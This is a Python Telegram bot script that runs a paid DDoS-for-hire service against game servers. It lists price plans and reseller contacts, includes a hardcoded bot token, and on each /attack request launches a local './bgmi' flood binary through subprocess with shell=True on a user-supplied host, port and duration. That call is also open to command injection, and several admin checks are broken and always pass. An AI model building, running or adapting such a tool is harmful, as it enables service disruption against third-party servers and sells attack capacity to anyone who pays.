#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7258166817:AAFvI2fPdSML16gs9_K08rjNJZquINvyoRA')

# Owner user ID
owner_id = "6470093043"

# Admin user IDs
admin_ids = ["6470093043"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store admin IDs
ADMIN_FILE = "admins.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read admin IDs from the file
def read_admins():
    try:
        with open(ADMIN_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Load allowed user and admin IDs
allowed_user_ids = read_users()
admin_ids = read_admins()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit in ["hour", "hours"]:
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ["day", "days"]:
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ["week", "weeks"]:
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ["month", "months"]:
        expiry_date = current_time + datetime.timedelta(days=30 * duration)
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()
                if time_unit not in ['hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months']:
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "Only Admins or the Owner can run this command 😡."

    bot.reply_to(message, response)

# Command handler for removing a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>😘'''
    else:
        response = "Only Admins or the Owner can run this command 😡."

    bot.reply_to(message, response)

# Command handler for adding an admin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) > 1:
            admin_to_add = command[1]
            if admin_to_add not in admin_ids:
                admin_ids.append(admin_to_add)
                with open(ADMIN_FILE, "a") as file:
                    file.write(f"{admin_to_add}\n")
                response = f"Admin {admin_to_add} added successfully 👍."
            else:
                response = "Admin already exists 🤦‍♂️."
        else:
            response = "Please specify an admin ID to add 😘."
    else:
        response = "Only the Owner can run this command 😡."

    bot.reply_to(message, response)

# Command handler for removing an admin
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) > 1:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                with open(ADMIN_FILE, "w") as file:
                    for admin_id in admin_ids:
                        file.write(f"{admin_id}\n")
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify An Admin ID to Remove. 
✅ Usage: /removeadmin <adminid>😘'''
    else:
        response = "Only the Owner can run this command 😡."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    if user_id == owner_id:
     user_role = "Owner"
    elif user_id in admin_ids:
     user_role = "Admin"
    else:
     user_role = "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

    

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)



@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Owner and Admin Can Run This Command 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command 😡."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
            
    response = f"🚀Attack Sent Successfully! 🚀\n\n🗿𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n🕦Attack Duration: {time}\n💣Method: SHEROP_VIP\n\n🔥Status: Attack in Progress... 🔥"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

# Handler for /attack command and direct attack input
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is not an admin or owner
        if user_id not in admin_ids and user_id != owner_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
                response = "You Are On Cooldown ❌. Please Wait 120sec Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        # Check if the message starts with '/attack' or not
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            # If it doesn't start with '/', assume it's an attack command and adjust the command list
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 280"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response ="Please provide attack in the following format:\n\n<host> <port> <time>" 
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your capabilities!\n\n"
                    "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /attack : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥 /myinfo : TO Check Your WHOLE INFO.

🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @shermodder
Official Channel :- @shermodder
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message,) 

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED @THE_YAMRAJ OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
Day-->150 Rs
Week-->750 Rs
Month-->1600 Rs
Dm @Shermodder TO BUY
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /approve <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
🚀 /addadmin : To add an admin.
🚀/removeadmin : To remove an admin.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This # Function to handle the main menu"
@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = telebot.types.KeyboardButton('🚀Attack')
    btn2 = telebot.types.KeyboardButton('💼ResellerShip')
    btn3 = telebot.types.KeyboardButton('ℹ️ My Info')
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "Welcome To YAMRAJ || VIP Please choose an option:", reply_markup=markup)

# Function to handle ResellerShip button
@bot.message_handler(func=lambda message: message.text == '💼 ResellerShip')
def handle_resellership(message):
    bot.reply_to(message, "Contact @Shermodder  for reseller ship.")

# Function to handle My Info button
@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def handle_my_info(message):
    user_id = str(message.chat.id)
    response = f"Your Info:\nUser ID: {user_id}\n"
    if user_id in allowed_user_ids:
        response += "Access: Allowed\n"
    else:
        response += "Access: Not Allowed\n"
    bot.reply_to(message, response)

# Function to handle Attack button
@bot.message_handler(func=lambda message: message.text == '🚀Attack')
def handle_attack_button(message):
    bot.reply_to(message, "To use the attack command, type it in the following format:\n\n/attack <host> <port> <time>")

# Start the bot
bot.polling()